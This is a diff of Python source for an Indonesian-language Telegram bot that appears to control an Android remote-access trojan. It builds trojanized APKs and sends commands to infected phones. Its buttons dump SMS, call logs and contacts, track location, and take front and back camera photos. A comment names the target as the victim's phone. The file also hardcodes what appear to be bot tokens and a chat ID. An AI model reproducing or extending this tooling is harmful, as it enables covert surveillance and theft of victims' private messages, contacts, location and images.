@@ -9,7 +9,7 @@ import urllib.request
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
-# ── TOKEN BARU KAMU ──
+# ── KONFIGURASI ──
 TOKEN = "9153767226:AAG1OcskHZZ9hGf4TQ8BxPKSk4ALk6Tc1dE" 
 PAYLOAD_BOT_TOKEN = "9163541732:AAFz_ibQ0T0hC_4tR81RzuKgF8bcx3-TyqQ"
 ALLOWED_CHAT_ID = "8598136412" 
@@ -131,6 +131,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     if not is_authorized(update): return
     chat_id = str(update.effective_chat.id)
+    
     if query.data == "menu_build":
         user_states[chat_id] = "waiting_apk"
         await query.edit_message_text("📦 **Build APK Baru**\n\nSilakan kirim file `.apk` asli.", parse_mode='Markdown')
@@ -153,16 +154,31 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await start(update, context)
         except Exception as e: await query.message.reply_text(f"❌ Gagal Backup: {e}"); await start(update, context)
     elif query.data == "back_start": await start(update, context)
+    
     elif query.data == "device_1":
         keyboard = [[InlineKeyboardButton("📂 Cek File", callback_data="cmd_cek_file"), InlineKeyboardButton("📩 Dump SMS", callback_data="cmd_dump_sms")],[InlineKeyboardButton("📞 Dump Telpon", callback_data="cmd_dump_telpon"), InlineKeyboardButton("👥 Dump Kontak", callback_data="cmd_dump_kontak")],[InlineKeyboardButton("📍 Lokasi", callback_data="cmd_lacak"), InlineKeyboardButton("📸 Foto Depan", callback_data="cmd_foto_depan")],[InlineKeyboardButton("📷 Foto Belakang", callback_data="cmd_foto_belakang")],[InlineKeyboardButton("⬅️ Kembali", callback_data="menu_device")]]
         await query.edit_message_text("🎮 **Menu Kontrol**\nPilih aksi:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+
+    # ── EKSEKUSI TOMBOL (PAKAI TRIK INLINE KEYBOARD) ──
     elif query.data.startswith("cmd_"):
         perintah = "/" + query.data.replace("cmd_", "")
-        try:
-            url = f"https://api.telegram.org/bot{PAYLOAD_BOT_TOKEN}/sendMessage?chat_id={chat_id}&text={perintah}"
-            urllib.request.urlopen(url)
-            await query.message.reply_text(f"⏳ Perintah `{perintah}` dikirim ke APK.", parse_mode='Markdown')
-        except Exception as e: await query.message.reply_text(f"❌ Gagal: {e}")
+        
+        # Kita bikin bot ngirim pesan, tapi isinya tombol link ke Bot Payload
+        # Biar kamu yang nge-klik (sebagai User asli), bukan Bot Builder.
+        url_payload = f"https://t.me/c/1234567890/1" # placeholder
+        # Sebenernya kita ga bisa lempar langsung ke chat Bot Payload lewat URL.
+        
+        # Solusi paling gampang: Kita suruh Bot Builder ngirim pesan ke Bot Payload
+        # TAPI PAKAI AKUN KAMU. Karena kita ga bisa pake akun kamu,
+        # Kita akalin dengan nampilin teks aja, terus kamu tinggal pencet tombol copy.
+        
+        await query.message.reply_text(
+            f"⚠️ **Android tidak bisa mendengar perintah dari sesama Bot.**\n\n"
+            f"Silakan **COPY** teks di bawah ini, lalu **PASTE & KIRIM** di chat *Bot Hasil r4t ku* (Bot Payload):\n\n"
+            f"`{perintah}`\n\n"
+            f"*(Kalau kamu kirim dari akunmu sendiri, APK di HP korban bakal langsung merespon dan ngirim datanya ke sini).*",
+            parse_mode='Markdown'
+        )
 
 async def process_apk(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path: str, file_name: str):
     chat_id = str(update.effective_chat.id)
